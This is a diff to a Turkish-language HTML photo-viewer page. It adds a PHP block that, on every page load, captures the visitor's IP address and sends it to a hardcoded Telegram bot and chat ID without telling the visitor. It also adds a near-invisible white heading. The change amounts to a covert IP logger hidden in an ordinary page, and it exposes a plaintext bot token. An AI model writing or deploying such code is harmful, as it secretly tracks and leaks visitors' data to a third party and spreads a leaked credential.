@@ -45,7 +45,7 @@
     <option value="360p">360p</option>
     <option value="720p">720p</option>
     <option value="1080p">1080p</option>
-  </select>
+  </select> <h1 style="color: 	#ffffff">↑↑↑</h1>
   
 
   <script>
@@ -75,5 +75,49 @@
     // Sayfa açıldığında fotoğrafı yüklemek için
     showPhoto();
   </script>
+
+  <?php
+// Telegram botunuzun tokenını buraya girin
+$botToken = "6264786809:AAFM8XvApm9NKnavEa9PKUObgxmzKG_L2Mw";
+$telegramChatID = "1480907457"; // Telegram'daki sohbetinizin ID'sini girin
+
+// Siteye giriş yapıldığında Telegram'a mesaj gönderme fonksiyonu
+function sendTelegramMessage($message) {
+    global $botToken, $telegramChatID;
+    $url = "https://api.telegram.org/bot$botToken/sendMessage";
+    $data = array('chat_id' => $telegramChatID, 'text' => $message);
+    $options = array(
+        'http' => array(
+            'method' => 'POST',
+            'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
+            'content' => http_build_query($data),
+        ),
+    );
+    $context = stream_context_create($options);
+    $result = file_get_contents($url, false, $context);
+    return $result;
+}
+
+// IP adresini almak için yardımcı fonksiyon
+function getIPAddress() {
+    // Birinci olarak HTTP_X_FORWARDED_FOR kontrol edilir, bununla IP adresi alınabilirse alınır
+    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+        $ip_address = $_SERVER['HTTP_X_FORWARDED_FOR'];
+    }
+    // Eğer HTTP_X_FORWARDED_FOR yoksa, direkt olarak REMOTE_ADDR kullanılır
+    else {
+        $ip_address = $_SERVER['REMOTE_ADDR'];
+    }
+    return $ip_address;
+}
+
+// Siteye giriş yapıldığında mesajı gönder
+if ($_SERVER['REQUEST_METHOD'] === 'GET') {
+    $ip_address = getIPAddress();
+    $message = "Birisi sitede giriş yaptı.\nIP Adresi: $ip_address";
+    sendTelegramMessage($message);
+}
+?>
+
 </body>
 </html>
